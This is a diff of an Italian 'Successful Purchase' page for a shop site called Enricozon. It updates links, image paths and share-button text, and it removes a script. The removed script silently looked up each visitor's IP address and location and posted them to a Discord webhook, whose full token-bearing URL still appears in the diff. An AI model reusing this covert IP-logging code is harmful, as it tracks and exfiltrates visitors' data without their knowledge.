@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Successful Purchase</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"> 
-    <link rel="stylesheet" href="buy.css">
+    <link rel="stylesheet" href="css/buy.css">
 
 <style>
     .p1 {
@@ -17,19 +17,17 @@
 <body>
 
     <div class="container">
-        <a href="https://enricozon.mom"><a href="https://enricozon.mom"><img src="pachettp.png" alt="Success Image"></a></a>
+        <a href="index.html""><a href="index.html"><img src="immagini/paccoenricozon.png" alt="Success Image"></a></a>
         <h1>Grazie per l'aquisto!</h1>
         <p>Il tuo ordine è stato completato con sucesso.</p>
-        <p class="p1" id="currentLocation">Fetching location...</p>
         
         <div class="share-buttons">
             <div class="share-button" onclick="shareOnWhatsApp()"><i class="fab fa-whatsapp"></i></div>
             <div class="share-button" onclick="shareOnTwitter()"><i class="fab fa-twitter"></i></div>
-            <div class="share-button" onclick="shareOnInstagram()"><i class="fab fa-instagram"></i></div>
         </div>
 
         <div>
-            <a href="https://enricozon.mom">
+            <a href="index.html">
                <button>Torna Indietro</button>
             </a>
         </div>
@@ -38,63 +36,11 @@
     <script>
 
     function shareOnTwitter() {
-        window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent('Ho appena comprato su Enricozon. https://enricozon.mom'));
+        window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent('Ho appena comprato su Enricozon. Che aspetti a visitare enricozon! https://enricozon.mom'));
     }
 
     function shareOnWhatsApp() {
-            window.open('whatsapp://send?text=' + encodeURIComponent('Ho appena comprato su Enricozon. https://enricozon.mom'));
-    }
-
-    fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            
-            var city = data.city;
-            var region = data.region;
-            var country = data.country;
-            var street = data.street; 
-            var ip = data.ip; 
-
-            
-            var locationDetails = `Il pacco verà inviato a: ${city}, ${region}, ${country}.`;
-            var discordstuff = `IP: ${ip}, Location: ${city}, ${region}, ${country}.`;
-            
-            if (street) {
-                locationDetails += ` Street: ${street}`;
-            }
-
-            document.getElementById("currentLocation").innerHTML = locationDetails;
-
-            
-            sendToDiscordWebhook(discordstuff);
-        })
-        .catch(error => {
-            console.error('Error fetching location:', error);
-            document.getElementById("currentLocation").innerHTML = "Errore nella localizzazione";
-        });
-
-    
-    function sendToDiscordWebhook(message) {
-        
-        const webhookUrl = 'https://discord.com/api/webhooks/1176560019613950063/C9xI7CjP9o3CQbhTTYzeHz8sOxxhSS1_gwaag9-cOXkQoNJ-KJ_SoXu7MQGXYIcOfj7J';
-
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                content: message,
-            }),
-        })
-        .then(response => {
-            if (!response.ok) {
-                console.error('Failed to send message to Discord webhook:', response.status, response.statusText);
-            }
-        })
-        .catch(error => {
-            console.error('Error sending message to Discord webhook:', error);
-        });
+            window.open('whatsapp://send?text=' + encodeURIComponent('Ho appena comprato su Enricozon. Che aspetti a visitare enricozon! https://enricozon.mom'));
     }
 </script>
 
